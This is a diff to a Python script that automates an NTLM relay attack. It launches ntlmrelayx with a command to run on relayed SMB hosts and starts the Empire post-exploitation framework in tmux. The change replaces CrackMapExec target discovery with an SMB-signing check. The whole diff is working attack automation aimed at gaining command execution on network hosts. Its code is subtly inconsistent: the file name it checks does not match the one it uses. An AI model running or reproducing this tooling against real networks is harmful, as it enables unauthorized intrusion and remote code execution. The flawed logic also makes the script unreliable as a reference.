@@ -101,10 +101,8 @@ def main():
     tmux_pane = tmux_window.attached_pane
     
     if launch_relayx:
-        print("Getting relay target list using CrackMapExec...")
-        print("This can take a few minutes on a full subnet - we need to find a more efficient way to do this part...")
-        subprocess.Popen("touch targets.txt", shell=True).wait()
-        subprocess.Popen("cme --timeout 15 smb %s --gen-relay-list targets.txt" % (target_ip), shell=True).wait()
+        print("Getting relay target list")
+        subprocess.Popen("/opt/check-smb-signing.sh --nmap --out-dir /tmp -a %s" % (target_ip), shell=True).wait()
     
     if launch_empire:
         print("\nLaunching Empire (waiting 5s)...")
@@ -152,8 +150,12 @@ def main():
             line=line.replace("HTTPS = On","HTTPS = Off")
             print(line)
         fileinput.close()
+        
+        if os.path.exists("/tmp/hosts-signing-disabled"):
+            command = "ntlmrelayx.py -smb2support -tf %s -c '%s'" % ("/tmp/hosts-signing-disabled.txt", relayx_command)
+        else:
+            command = "ntlmrelayx.py -smb2support -t %s -c '%s'" % (target_ip, relayx_command)
             
-        command = "ntlmrelayx.py -smb2support -tf targets.txt -c '" + relayx_command + "'"
         #tmux_window.split_window(shell=command)
         tmux_pane = tmux_pane.split_window()
         tmux_pane.send_keys(command)
